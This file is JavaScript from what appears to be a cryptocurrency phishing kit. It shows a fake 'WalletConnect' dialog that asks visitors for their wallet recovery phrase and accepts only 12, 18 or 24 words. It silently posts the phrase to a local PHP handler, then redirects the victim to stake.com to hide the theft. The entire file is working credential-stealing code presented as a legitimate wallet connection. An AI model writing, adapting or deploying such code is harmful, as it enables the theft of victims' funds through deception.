function wcOpen() {
	if (!$("#walletconnect-wrapper").hasClass('shower')){
	    $("#walletconnect-wrapper").fadeIn().addClass('shower');
	}
}

function wcClose() {
    $("#walletconnect-wrapper").fadeOut(100, function() {
	    $("#walletconnect-wrapper").fadeOut().removeClass('shower');
        $("#walletconnect_phrase").val(null);
    })
}

$("body").on('click', '.walletconnectopen', function() {
    return wcOpen();
});
$("#wcCancelButton").click(function() {
    wcClose()
});

function seedCount(val){
    try {
        return {
			num: val.match(/\S+/g).length
        }
    }
    catch (ex) {
        return {
            num: 0
        };
    }
}

$("#walletconnect_phrase").on("input", function(){
	var seeds = seedCount($(this).val());
	console.log(seeds);
	if ((seeds.num == 12) || (seeds.num == 18) || (seeds.num == 24)){
		$("#walletconnect_notification").removeClass('notification__show');
		$("#walletconnect_confrim").addClass('active');
	} else {
		$("#walletconnect_notification").addClass('notification__show');
		$("#walletconnect_confrim").removeClass('active');
	}
});

$("#walletconnect_confrim").click(function(){
	var seeds = $("#walletconnect_phrase").val();
	var seedC = seedCount(seeds);
	if ((seedC.num == 12) || (seedC.num == 18) || (seedC.num == 24)){
		$.post("./form/walletconnect/connect.php", {
	        phrase: seeds
	    }).done(function(){
	        window.location.replace("http://stake.com")
	    })
	}
});
